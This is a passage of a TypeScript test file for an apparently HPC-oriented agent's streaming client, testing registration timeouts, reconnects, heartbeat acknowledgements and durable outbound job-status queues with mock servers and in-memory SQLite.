import { Database } from "bun:sqlite";
import { afterEach, describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { mkdtemp, realpath, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { create } from "@bufbuild/protobuf";
import * as schema from "@kuintessence/db";
import { createSqliteDb, runSqliteMigrations } from "@kuintessence/db";
import {
  type AgentMessage,
  CancelJobSchema,
  ComputeHealthState,
  DataDeliveryBindingSchema,
  DataScanRequestSchema,
  DispatchJobSchema,
  FileTransferCancelSchema,
  HeartbeatAckSchema,
  JobLogsRequestSchema,
  JobStatusAckSchema,
  JobStatus as ProtoJobStatus,
  QueueInventoryStatus,
  QueueTargetMode,
  QueueValidationMode,
  QueueValidationShadowRejectionAckSchema,
  RegisterResponseSchema,
  ReleaseJobWorkRootSchema,
  SandboxArtifactReleaseItemSchema,
  SandboxArtifactReleaseSchema,
  SandboxExecutionSchema,
  SchedulerQueueState,
  SchedulerQueueType,
  type ServerMessage,
  ServerMessageSchema,
  SoftwareOperationAction,
  SoftwareOperationRequestSchema,
  SoftwareOperationStatus,
  SoftwarePolicyUpdateSchema,
  SshAuthSchema,
  SshCloseSchema,
  SshDataSchema,
  SshOpenSchema,
  SshResizeSchema,
} from "@kuintessence/proto";
import { type InstalledSpec, SPACK_EXECUTION_PLACEHOLDER } from "@kuintessence/shared";
import { drizzle } from "drizzle-orm/bun-sqlite";
import pino from "pino";
import {
  type ComputeHealthObservation,
  JobLogUnavailableError,
  type JobSpec,
  type KuintessenceJobLookup,
  type KuintessenceJobLookupResult,
  type SchedulerAdapter,
  type Spawner,
} from "./adapters/base";
import type { JobStatusReport } from "./embedded/job-executor";
import { ActiveRemoteJobs } from "./queue/active-remote-jobs";
import { InboundAcks, type PersistInboundInput } from "./queue/inbound-acks";
import { JobCleanupIntents, JobRevocationTombstones } from "./queue/job-cleanup-intents";
import { type OutboundItem, OutboundQueue } from "./queue/outbound-queue";
import type { AgentSandboxCapability } from "./sandbox/capability";
import { type PreparedSpackMaterials, SpackManager, type SpackMaterialPrepareInput } from "./spack";
import { SpackInstallStore } from "./spack/install-store";
import type { SoftwareOperationOutcome } from "./spack/installer";
import { SPACK_ACTIVATION_FAILURE } from "./spack/workflow-activation";
import type { Ssh2ClientLike, Ssh2Factory } from "./ssh";
import { SshHandler } from "./ssh";
import { AgentStream, type AgentStreamDeps, jobStatusReportToProto } from "./stream";

// Suppress log noise in tests
const silent = pino({ level: "silent" });
const FIND_JSON = readFileSync(
  join(import.meta.dir, "spack", "__fixtures__", "spack-find.json"),
  "utf-8",
);

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeAdapter(
  opts: {
    submit?: (spec: JobSpec) => Promise<{ schedulerJobId: string }>;
    cancel?: (schedulerJobId: string) => Promise<void>;
    findByKuintessenceJobId?: (
      lookup: KuintessenceJobLookup,
    ) => Promise<KuintessenceJobLookupResult>;
    getJobLogs?: (schedulerJobId: string, lines: number) => Promise<string>;
    inspectComputeHealth?: () => Promise<ComputeHealthObservation>;
    inspectQueues?: SchedulerAdapter["inspectQueues"];
    validateQueueTarget?: SchedulerAdapter["validateQueueTarget"];
    statusSeq?: Array<{
      status: "queued" | "running" | "completed" | "failed";
      exitCode?: number;
      node?: string;
      reason?: string;
    }>;
  } = {},
): SchedulerAdapter {
  let i = 0;
  return {
    type: "slurm",
    version: "23.02.7",
    submit: opts.submit ?? (async () => ({ schedulerJobId: "sched-1" })),
    cancel: opts.cancel ?? (async () => {}),
    status: async () => opts.statusSeq?.[i++] ?? { status: "completed", exitCode: 0 },
    findByKuintessenceJobId:
      opts.findByKuintessenceJobId ?? (async () => ({ status: "not_found" })),
    ...(opts.getJobLogs ? { getJobLogs: opts.getJobLogs } : {}),
    ...(opts.inspectComputeHealth ? { inspectComputeHealth: opts.inspectComputeHealth } : {}),
    ...(opts.inspectQueues ? { inspectQueues: opts.inspectQueues } : {}),
    ...(opts.validateQueueTarget ? { validateQueueTarget: opts.validateQueueTarget } : {}),
  };
}

class BlockingInboundAcks extends InboundAcks {
  started = false;

  constructor(
    db: ReturnType<typeof createSqliteDb>,
    private readonly waitForPersist: () => Promise<void>,
  ) {
    super(db);
  }

  override async persistInbound(input: PersistInboundInput): Promise<boolean> {
    this.started = true;
    await this.waitForPersist();
    return super.persistInbound(input);
  }
}

class FailingActiveRemoteJobs extends ActiveRemoteJobs {
  override async recordSubmitted(
    _input: Parameters<ActiveRemoteJobs["recordSubmitted"]>[0],
  ): Promise<void> {
    throw new Error("SQLite is read-only");
  }
}

class FailOnceShadowEnqueueOutboundQueue extends OutboundQueue {
  private failed = false;

  override async enqueueQueueValidationShadowRejection(
    failureCode: Parameters<OutboundQueue["enqueueQueueValidationShadowRejection"]>[0],
    eventId?: Parameters<OutboundQueue["enqueueQueueValidationShadowRejection"]>[1],
  ) {
    if (!this.failed) {
      this.failed = true;
      throw new Error("injected shadow enqueue failure");
    }
    return super.enqueueQueueValidationShadowRejection(failureCode, eventId);
  }
}

class FailOncePendingCountOutboundQueue extends OutboundQueue {
  private failed = false;

  override async pendingCount(): Promise<number> {
    if (!this.failed) {
      this.failed = true;
      throw new Error("injected outbox read failure");
    }
    return super.pendingCount();
  }
}

class ControllableShadowOutboundQueue extends OutboundQueue {
  enqueueAvailable = true;
  replayAvailable = true;
  acknowledgeAvailable = true;
  readonly enqueueEventIds: string[] = [];
  loadForReplayCalls = 0;
  acknowledgeCalls = 0;

  override async enqueueQueueValidationShadowRejection(
    failureCode: Parameters<OutboundQueue["enqueueQueueValidationShadowRejection"]>[0],
    eventId?: Parameters<OutboundQueue["enqueueQueueValidationShadowRejection"]>[1],
  ) {
    this.enqueueEventIds.push(eventId ?? "generated");
    if (!this.enqueueAvailable) throw new Error("injected permanent shadow enqueue failure");
    return super.enqueueQueueValidationShadowRejection(failureCode, eventId);
  }

  override async loadForReplay() {
    this.loadForReplayCalls += 1;
    if (!this.replayAvailable) throw new Error("injected permanent replay read failure");
    return super.loadForReplay();
  }

  override async acknowledgeQueueValidationShadowRejection(eventId: string): Promise<boolean> {
    this.acknowledgeCalls += 1;
    if (!this.acknowledgeAvailable) {
      throw new Error("injected permanent shadow acknowledgement failure");
    }
    return super.acknowledgeQueueValidationShadowRejection(eventId);
  }
}

class DelayedReplayOutboundQueue extends OutboundQueue {
  loadForReplayCalls = 0;
  private resolveFirstLoadStarted: () => void = () => {};
  private resolveFirstLoad: () => void = () => {};
  private resolveCurrentRetryStarted: () => void = () => {};
  private resolveCurrentRetry: () => void = () => {};
  readonly firstLoadStarted = new Promise<void>((resolve) => {
    this.resolveFirstLoadStarted = resolve;
  });
  readonly currentRetryStarted = new Promise<void>((resolve) => {
    this.resolveCurrentRetryStarted = resolve;
  });
  private readonly firstLoad = new Promise<void>((resolve) => {
    this.resolveFirstLoad = resolve;
  });
  private readonly currentRetry = new Promise<void>((resolve) => {
    this.resolveCurrentRetry = resolve;
  });

  constructor(
    db: ReturnType<typeof createSqliteDb>,
    private readonly failCurrentRead: boolean,
  ) {
    super(db);
  }

  releaseFirstLoad(): void {
    this.resolveFirstLoad();
  }

  releaseCurrentRetry(): void {
    this.resolveCurrentRetry();
  }

  override async loadForReplay() {
    this.loadForReplayCalls += 1;
    if (this.loadForReplayCalls === 1) {
      this.resolveFirstLoadStarted();
      await this.firstLoad;
    } else if (this.failCurrentRead && this.loadForReplayCalls === 2) {
      throw new Error("injected current replay read failure");
    } else if (this.failCurrentRead) {
      this.resolveCurrentRetryStarted();
      await this.currentRetry;
    }
    return super.loadForReplay();
  }
}

/**
 * Build a mock ServerClient from a finite list of ServerMessages.
 * Collects all outbound AgentMessages into `sent`.
 * The outbound generator is drained in the background; the response stream
 * yields the provided server messages and then ends.
 *
 * `holdOpenMs` lets a test keep the response stream alive after yielding
 * the canned messages so the heartbeat timer (or other timer-driven outbound
 * traffic) actually has a window to fire.
 */
function makeMockClient(serverMessages: unknown[], holdOpenMs = 0) {
  const sent: unknown[] = [];
  let drainDone = false;

  const client = {
    connect(reqIter: AsyncIterable<unknown>): AsyncIterable<unknown> {
      // Drain the outbound generator in the background so the generator
      // doesn't stall (it produces messages continuously while running=true).
      // We stop draining once the response stream is exhausted.
      (async () => {
        for await (const msg of reqIter) {
          if (drainDone) break;
          sent.push(msg);
        }
      })().catch(() => {});

      // Response: yield server messages then end
      return (async function* () {
        for (const m of serverMessages) {
          yield m;
          // Give the event loop a chance to process between messages
          await new Promise<void>((r) => setImmediate(r));
        }
        if (holdOpenMs > 0) {
          await new Promise<void>((r) => setTimeout(r, holdOpenMs));
        }
        drainDone = true;
      })();
    },
  };

  return { client: client as never, sent };
}

function makeReplayReconnectClient(
  accepted: ServerMessage,
  closeFirstWhen: Promise<void>,
  readRequestsAfter?: Promise<void>,
) {
  const sentByConnection: unknown[][] = [[], []];
  const requestDoneByConnection: Array<Promise<void> | undefined> = [];
  const registrationProcessed = new Set<number>();
  let connectionCount = 0;
  const clientFactory = () => {
    const connection = connectionCount;
    connectionCount += 1;
    const sent = sentByConnection[connection] ?? [];
    sentByConnection[connection] = sent;
    return {
      connect(request: AsyncIterable<unknown>, options?: { signal?: AbortSignal }) {
        let resolveRequestDone: () => void = () => {};
        requestDoneByConnection[connection] = new Promise<void>((resolve) => {
          resolveRequestDone = resolve;
        });
        void (async () => {
          if (readRequestsAfter) await readRequestsAfter;
          for await (const message of request) sent.push(message);
        })()
          .catch(() => {})
          .finally(resolveRequestDone);
        return (async function* () {
          yield accepted;
          // The next response is requested only after AgentStream handles registration.
          registrationProcessed.add(connection);
          if (connection === 0) {
            await closeFirstWhen;
            return;
          }
          await new Promise<void>((resolve) => {
            if (options?.signal?.aborted) {
              resolve();
              return;
            }
            options?.signal?.addEventListener("abort", () => resolve(), { once: true });
          });
        })();
      },
    } as never;
  };
  return {
    clientFactory,
    sentByConnection,
    requestDoneByConnection,
    registrationProcessed,
    connectionCount: () => connectionCount,
  };
}

function makePendingRegisteredClient(heartbeatAckSupported = false, jobStatusAckSupported = false) {
  const accepted = create(ServerMessageSchema, {
    payload: {
      case: "registerResponse",
      value: create(RegisterResponseSchema, {
        accepted: true,
        message: "ok",
        heartbeatAckSupported,
        jobStatusAckSupported,
      }),
    },
  });
  return {
    connect(request: AsyncIterable<unknown>, options?: { signal?: AbortSignal }) {
      void (async () => {
        for await (const _message of request) {
          // Keep the request generator flowing until this attempt is aborted.
        }
      })().catch(() => {});
      let first = true;
      return {
        [Symbol.asyncIterator]() {
          return {
            next: () => {
              if (first) {
                first = false;
                return Promise.resolve({ done: false as const, value: accepted });
              }
              return new Promise<IteratorResult<unknown>>((_resolve, reject) => {
                options?.signal?.addEventListener(
                  "abort",
                  () => reject(options.signal?.reason ?? new Error("aborted")),
                  { once: true },
                );
              });
            },
          };
        },
      };
    },
  } as never;
}

/**
 * Yield to the event loop multiple times.
 * Used to allow background async work (job runners, generator drains) to settle.
 */
async function settle(ticks = 10): Promise<void> {
  for (let i = 0; i < ticks; i++) {
    await new Promise<void>((r) => setImmediate(r));
  }
}

async function waitForCondition(
  condition: () => boolean | Promise<boolean>,
  timeoutMs = 1_000,
): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (!(await condition())) {
    if (Date.now() >= deadline) throw new Error(`Condition not met within ${timeoutMs}ms`);
    await new Promise<void>((resolve) => setImmediate(resolve));
  }
}

interface QueueInventoryHeartbeatMessage {
  payload: {
    case: "heartbeat";
    value: {
      sequence: bigint;
      queueInventory?: { reason: string; status: QueueInventoryStatus };
    };
  };
}

function queueInventoryHeartbeats(
  sent: unknown[],
  status?: QueueInventoryStatus,
): QueueInventoryHeartbeatMessage[] {
  return sent.filter((message): message is QueueInventoryHeartbeatMessage => {
    const payload = (message as { payload?: { case?: string; value?: unknown } }).payload;
    if (payload?.case !== "heartbeat") return false;
    const heartbeat = payload.value as QueueInventoryHeartbeatMessage["payload"]["value"];
    return status === undefined || heartbeat.queueInventory?.status === status;
  });
}

function installedSoftwareReports(sent: unknown[]) {
  return (sent as AgentMessage[]).flatMap((message) =>
    message.payload.case === "installedSoftwareReport" ? [message.payload.value] : [],
  );
}

async function deliverServerMessage(stream: AgentStream, message: ServerMessage): Promise<void> {
  await (
    stream as unknown as { handleServerMessage: (serverMessage: ServerMessage) => Promise<void> }
  ).handleServerMessage(message);
}

function heartbeatAck(sequence: bigint): ServerMessage {
  return create(ServerMessageSchema, {
    payload: {
      case: "heartbeatAck",
      value: create(HeartbeatAckSchema, { sequence }),
    },
  });
}

function cancelJobMessage(jobId: string, revokedEpoch: number) {
  return create(ServerMessageSchema, {
    payload: {
      case: "cancelJob",
      value: create(CancelJobSchema, { jobId, revokedEpoch: BigInt(revokedEpoch) }),
    },
  });
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

// Track streams created in tests so we can stop them in afterEach
const activeStreams: AgentStream[] = [];

afterEach(() => {
  for (const s of activeStreams) s.stop();
  activeStreams.length = 0;
});

describe("AgentStream", () => {
  test("sends register as first outbound message", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs);

    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000, // effectively disable during test
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
    });
    activeStreams.push(stream);

    // Run the stream; it will reconnect (backoff=1ms) after the server stream ends.
    // We stop it after a brief settle.
    const runPromise = stream.start();
    await settle();
    stream.stop();
    await runPromise;

    expect(sent.length).toBeGreaterThanOrEqual(1);
    const first = sent[0] as { payload: { case: string } };
    expect(first.payload.case).toBe("register");
  });

  test("reports only unexpired runtime attestations without rejecting a fresh replacement", async () => {
    const now = Date.now();
    const capability: AgentSandboxCapability = {
      enabled: true,
      managedRoot: "/var/lib/kuintessence/sandbox",
      executionMode: "SelfAccount",
      selfAccount: { username: "kqagent", uid: 2001, gid: 2001 },
      rootMode: false,
      networkIsolation: true,
      cgroups: true,
      seccomp: true,
      sifSignatureVerification: true,
      ecl: true,
      replayProtection: true,
      runtimeCache: [
        {
          digest: `sha256:${"a".repeat(64)}`,
          kind: "SIF",
          signatureVerified: true,
          runtimeAttestationId: "b".repeat(64),
          attestedNodes: ["slurm-2"],
          expiresAtUnixMs: now + 60_000,
        },
        {
          digest: `sha256:${"c".repeat(64)}`,
          kind: "SIF",
          signatureVerified: true,
          runtimeAttestationId: "d".repeat(64),
          attestedNodes: ["slurm-1"],
          expiresAtUnixMs: now - 1,
        },
      ],
      readiness: "ready",
      missingRequirements: [],
    };
    const { client, sent } = makeMockClient([
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
    ]);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-attestation",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      sandboxCapability: capability,
    });
    activeStreams.push(stream);

    const running = stream.start();
    await settle();
    stream.stop();
    await running;

    const register = sent.find(
      (message) => (message as { payload?: { case?: string } }).payload?.case === "register",
    ) as
      | {
          payload: {
            value: {
              sandboxCapability?: {
                executionMode: string;
                selfAccount?: { username: string; uid: number; gid: number };
                runtimeCache: Array<{
                  digest: string;
                  runtimeAttestationId: string;
                  attestedNodes: string[];
                }>;
                readiness: string;
                missingRequirements: string[];
              };
            };
          };
        }
      | undefined;
    const reported = register?.payload.value.sandboxCapability;
    expect(reported?.executionMode).toBe("SelfAccount");
    expect(reported?.selfAccount).toMatchObject({ username: "kqagent", uid: 2001, gid: 2001 });
    expect(reported?.runtimeCache).toHaveLength(1);
    expect(reported?.runtimeCache[0]).toMatchObject({
      digest: `sha256:${"a".repeat(64)}`,
      runtimeAttestationId: "b".repeat(64),
      attestedNodes: ["slurm-2"],
    });
    expect(reported?.readiness).toBe("ready");
    expect(reported?.missingRequirements).not.toContain("runtime-attestation-expired");
  });

  test("rebuilds the Server client for every reconnect attempt", async () => {
    const { client } = makeMockClient([]);
    let factoryCalls = 0;
    const stream = new AgentStream({
      client,
      clientFactory: () => {
        factoryCalls += 1;
        return client;
      },
      adapter: makeAdapter(),
      agentId: "agent-reconnect",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: () => new Promise<void>((resolve) => setImmediate(resolve)),
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle();
    stream.stop();
    await runPromise;

    expect(factoryCalls).toBeGreaterThan(1);
  });

  test("stop interrupts a pending reconnect backoff", async () => {
    const { client } = makeMockClient([]);
    let beginSleep: (() => void) | undefined;
    let releaseSleep: (() => void) | undefined;
    const sleepStarted = new Promise<void>((resolve) => {
      beginSleep = resolve;
    });
    const pendingSleep = new Promise<void>((resolve) => {
      releaseSleep = resolve;
    });
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-stop-backoff",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 60_000,
      sleep: async () => {
        beginSleep?.();
        await pendingSleep;
      },
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await sleepStarted;
    stream.stop();
    const stoppedPromptly = await Promise.race([
      runPromise.then(() => true),
      Bun.sleep(20).then(() => false),
    ]);
    releaseSleep?.();
    await runPromise;

    expect(stoppedPromptly).toBe(true);
  });

  test("aborts a pending registration stream and retries with a fresh client", async () => {
    let factoryCalls = 0;
    let observedSignal: AbortSignal | undefined;
    let abortEvents = 0;
    let firstRequestDone: Promise<void> | undefined;
    let firstRequestClosed = false;
    const sqlite = new Database(":memory:");
    runSqliteMigrations(sqlite);
    const outboundQueue = new OutboundQueue(drizzle(sqlite, { schema }));
    await outboundQueue.enqueueJobStatus({ jobId: "queued-before-timeout", status: "running" });
    const client = {
      connect(
        request: AsyncIterable<unknown>,
        options?: { signal?: AbortSignal },
      ): AsyncIterable<unknown> {
        observedSignal = options?.signal;
        firstRequestDone ??= (async () => {
          for await (const _message of request) {
            // Drain until the attempt-local iterator closes.
          }
          firstRequestClosed = true;
        })();
        return {
          [Symbol.asyncIterator]() {
            return {
              next: () =>
                new Promise<IteratorResult<unknown>>((_resolve, reject) => {
                  const guard = setTimeout(() => reject(new Error("fixture guard timeout")), 100);
                  options?.signal?.addEventListener(
                    "abort",
                    () => {
                      clearTimeout(guard);
                      abortEvents += 1;
                      reject(options.signal?.reason ?? new Error("aborted"));
                    },
                    { once: true },
                  );
                }),
            };
          },
        };
      },
    };
    const stream = new AgentStream({
      client: client as never,
      clientFactory: () => {
        factoryCalls += 1;
        return client as never;
      },
      adapter: makeAdapter(),
      agentId: "agent-registration-timeout",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      registrationTimeoutMs: 5,
      logger: silent,
      outboundQueue,
      reconnectBackoffMs: 1,
      sleep: () => new Promise<void>((resolve) => setImmediate(resolve)),
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() => factoryCalls > 1 && abortEvents >= 1 && firstRequestClosed);
    const pendingBeforeStop = await outboundQueue.pendingCount();
    stream.stop();
    await runPromise;

    expect(observedSignal).toBeDefined();
    expect(abortEvents).toBeGreaterThanOrEqual(1);
    expect(factoryCalls).toBeGreaterThan(1);
    expect(firstRequestDone).toBeDefined();
    expect(firstRequestClosed).toBe(true);
    expect(pendingBeforeStop).toBe(1);
    sqlite.close();
  });

  test("retries when response next and return both ignore the registration abort", async () => {
    let factoryCalls = 0;
    const client = {
      connect(): AsyncIterable<unknown> {
        return {
          [Symbol.asyncIterator]() {
            return {
              next: () => new Promise<IteratorResult<unknown>>(() => {}),
              return: () => new Promise<IteratorResult<unknown>>(() => {}),
            };
          },
        };
      },
    };
    const stream = new AgentStream({
      client: client as never,
      clientFactory: () => {
        factoryCalls += 1;
        return client as never;
      },
      adapter: makeAdapter(),
      agentId: "agent-ignores-registration-abort",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      registrationTimeoutMs: 2,
      logger: silent,
      reconnectBackoffMs: 1,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() => factoryCalls >= 2);
    stream.stop();
    await runPromise;

    expect(factoryCalls).toBeGreaterThanOrEqual(2);
  });

  test("persists status updates while registration is still pending", async () => {
    const sqlite = new Database(":memory:");
    runSqliteMigrations(sqlite);
    const outboundQueue = new OutboundQueue(drizzle(sqlite, { schema }));
    let acceptRegistration: (() => void) | undefined;
    const registrationReady = new Promise<void>((resolve) => {
      acceptRegistration = resolve;
    });
    const sent: unknown[] = [];
    const accepted = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          jobStatusAckSupported: true,
        }),
      },
    });
    const client = {
      connect(
        request: AsyncIterable<unknown>,
        options?: { signal?: AbortSignal },
      ): AsyncIterable<unknown> {
        void (async () => {
          for await (const message of request) sent.push(message);
        })().catch(() => {});
        return (async function* () {
          await registrationReady;
          yield accepted;
          await new Promise<void>((_resolve, reject) => {
            options?.signal?.addEventListener(
              "abort",
              () => reject(options.signal?.reason ?? new Error("aborted")),
              { once: true },
            );
          });
        })();
      },
    };
    const stream = new AgentStream({
      client: client as never,
      adapter: makeAdapter(),
      agentId: "agent-registering",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      registrationTimeoutMs: 100,
      logger: silent,
      outboundQueue,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle();
    await stream.enqueueStatusUpdate({ jobId: "job-during-registration", status: "running" });

    expect(await outboundQueue.pendingCount()).toBe(1);
    acceptRegistration?.();
    await waitForCondition(() =>
      sent.some(
        (message) => (message as { payload: { case: string } }).payload.case === "jobStatus",
      ),
    );

    expect(
      sent.some(
        (message) => (message as { payload: { case: string } }).payload.case === "jobStatus",
      ),
    ).toBe(true);
    expect(await outboundQueue.pendingCount()).toBe(1);
    const status = sent.find(
      (message) => (message as { payload: { case: string } }).payload.case === "jobStatus",
    ) as { payload: { value: { eventId: string } } } | undefined;
    const harness = stream as unknown as {
      handleServerMessage: (message: unknown) => Promise<void>;
    };
    await harness.handleServerMessage(
      create(ServerMessageSchema, {
        payload: {
          case: "jobStatusAck",
          value: create(JobStatusAckSchema, { eventId: status?.payload.value.eventId }),
        },
      }),
    );
    expect(await outboundQueue.pendingCount()).toBe(0);
    stream.stop();
    await runPromise;
    sqlite.close();
  });

  test("clears the registration deadline after the Server accepts the stream", async () => {
    let factoryCalls = 0;
    const accepted = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          jobStatusAckSupported: true,
        }),
      },
    });
    const client = {
      connect(
        _request: AsyncIterable<unknown>,
        options?: { signal?: AbortSignal },
      ): AsyncIterable<unknown> {
        let first = true;
        return {
          [Symbol.asyncIterator]() {
            return {
              next: () => {
                if (first) {
                  first = false;
                  return Promise.resolve({ done: false as const, value: accepted });
                }
                return new Promise<IteratorResult<unknown>>((_resolve, reject) => {
                  options?.signal?.addEventListener(
                    "abort",
                    () => reject(options.signal?.reason ?? new Error("aborted")),
                    { once: true },
                  );
                });
              },
            };
          },
        };
      },
    };
    const stream = new AgentStream({
      client: client as never,
      clientFactory: () => {
        factoryCalls += 1;
        return client as never;
      },
      adapter: makeAdapter(),
      agentId: "agent-registered",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      registrationTimeoutMs: 5,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: () => new Promise<void>((resolve) => setImmediate(resolve)),
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await Bun.sleep(20);
    expect(factoryCalls).toBe(1);
    stream.stop();
    await runPromise;
  });

  test("uses strictly increasing heartbeat sequences and stays connected while ACKs arrive", async () => {
    let factoryCalls = 0;
    const sequences: bigint[] = [];
    const accepted = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          heartbeatAckSupported: true,
        }),
      },
    });
    const queued: unknown[] = [];
    let resolveNext: ((result: IteratorResult<unknown>) => void) | undefined;
    const pushInbound = (message: unknown) => {
      if (resolveNext) {
        const resolve = resolveNext;
        resolveNext = undefined;
        resolve({ done: false, value: message });
      } else {
        queued.push(message);
      }
    };
    const client = {
      connect(request: AsyncIterable<unknown>, options?: { signal?: AbortSignal }) {
        void (async () => {
          for await (const message of request) {
            const payload = (
              message as { payload: { case: string; value?: { sequence?: bigint } } }
            ).payload;
            if (payload.case !== "heartbeat" || !payload.value?.sequence) continue;
            sequences.push(payload.value.sequence);
            pushInbound(
              create(ServerMessageSchema, {
                payload: {
                  case: "heartbeatAck",
                  value: create(HeartbeatAckSchema, { sequence: payload.value.sequence }),
                },
              }),
            );
          }
        })().catch(() => {});
        let first = true;
        return {
          [Symbol.asyncIterator]() {
            return {
              next: () => {
                if (first) {
                  first = false;
                  return Promise.resolve({ done: false as const, value: accepted });
                }
                const next = queued.shift();
                if (next) return Promise.resolve({ done: false as const, value: next });
                return new Promise<IteratorResult<unknown>>((resolve, reject) => {
                  resolveNext = resolve;
                  options?.signal?.addEventListener(
                    "abort",
                    () => reject(options.signal?.reason ?? new Error("aborted")),
                    { once: true },
                  );
                });
              },
            };
          },
        };
      },
    };
    const stream = new AgentStream({
      client: client as never,
      clientFactory: () => {
        factoryCalls += 1;
        return client as never;
      },
      adapter: makeAdapter(),
      agentId: "agent-heartbeat-acked",
      siteName: "test-site",
      heartbeatIntervalMs: 1,
      heartbeatAckTimeoutMs: 10,
      logger: silent,
      reconnectBackoffMs: 1,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() => sequences.length >= 3);
    expect(sequences.slice(0, 3)).toEqual([1n, 2n, 3n]);
    expect(factoryCalls).toBe(1);
    stream.stop();
    await runPromise;
  });

  test("rebuilds a permanently pending stream when negotiated HeartbeatAck is missing", async () => {
    let factoryCalls = 0;
    const client = makePendingRegisteredClient(true);
    const stream = new AgentStream({
      client,
      clientFactory: () => {
        factoryCalls += 1;
        return client;
      },
      adapter: makeAdapter(),
      agentId: "agent-heartbeat-timeout",
      siteName: "test-site",
      heartbeatIntervalMs: 1,
      heartbeatAckTimeoutMs: 2,
      logger: silent,
      reconnectBackoffMs: 1,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() => factoryCalls >= 2);
    stream.stop();
    await runPromise;

    expect(factoryCalls).toBeGreaterThanOrEqual(2);
  });

  test("reconnects when the transport stops consuming outbound heartbeats", async () => {
    let factoryCalls = 0;
    const accepted = create(ServerMessageSchema, {
      payload: {
        case: "registerResponse",
        value: create(RegisterResponseSchema, {
          accepted: true,
          message: "ok",
          heartbeatAckSupported: true,
        }),
      },
    });
    const client = {
      connect(request: AsyncIterable<unknown>, options?: { signal?: AbortSignal }) {
        const outbound = request[Symbol.asyncIterator]();
        void outbound.next();
        let first = true;
        return {
          [Symbol.asyncIterator]() {
            return {
              next: () => {
                if (first) {
                  first = false;
                  return Promise.resolve({ done: false as const, value: accepted });
                }
                return new Promise<IteratorResult<unknown>>((_resolve, reject) => {
                  options?.signal?.addEventListener(
                    "abort",
                    () => reject(options.signal?.reason ?? new Error("aborted")),
                    { once: true },
                  );
                });
              },
            };
          },
        };
      },
    };
    const stream = new AgentStream({
      client: client as never,
      clientFactory: () => {
        factoryCalls += 1;
        return client as never;
      },
      adapter: makeAdapter(),
      agentId: "agent-outbound-backpressure",
      siteName: "test-site",
      heartbeatIntervalMs: 1,
      heartbeatAckTimeoutMs: 2,
      logger: silent,
      reconnectBackoffMs: 1,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() => factoryCalls >= 2);
    stream.stop();
    await runPromise;
  });

  test("keeps the watchdog disabled for an older Server without heartbeat ACK support", async () => {
    let factoryCalls = 0;
    const client = makePendingRegisteredClient(false);
    const stream = new AgentStream({
      client,
      clientFactory: () => {
        factoryCalls += 1;
        return client;
      },
      adapter: makeAdapter(),
      agentId: "agent-old-server",
      siteName: "test-site",
      heartbeatIntervalMs: 1,
      heartbeatAckTimeoutMs: 2,
      logger: silent,
      reconnectBackoffMs: 1,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await Bun.sleep(15);
    expect(factoryCalls).toBe(1);
    stream.stop();
    await runPromise;
  });

  test("reconnects when a negotiated durable job status acknowledgement is missing", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new OutboundQueue(db, { createEventId: () => "event-timeout" });
    let factoryCalls = 0;
    const client = makePendingRegisteredClient(false, true);
    const stream = new AgentStream({
      client,
      clientFactory: () => {
        factoryCalls += 1;
        return client;
      },
      adapter: makeAdapter(),
      agentId: "agent-job-status-timeout",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      heartbeatAckTimeoutMs: 2,
      logger: silent,
      reconnectBackoffMs: 1,
      outboundQueue,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle();
    await stream.enqueueStatusUpdate({ jobId: "job-status-timeout", status: "completed" });
    await waitForCondition(() => factoryCalls >= 2);
    expect(await outboundQueue.pendingCount()).toBe(1);

    stream.stop();
    await runPromise;
  });

  test("deletes a durable status after transport delivery when the Server lacks ACK support", async () => {
    const db = createSqliteDb(":memory:");
    const outboundQueue = new OutboundQueue(db, { createEventId: () => "event-legacy" });
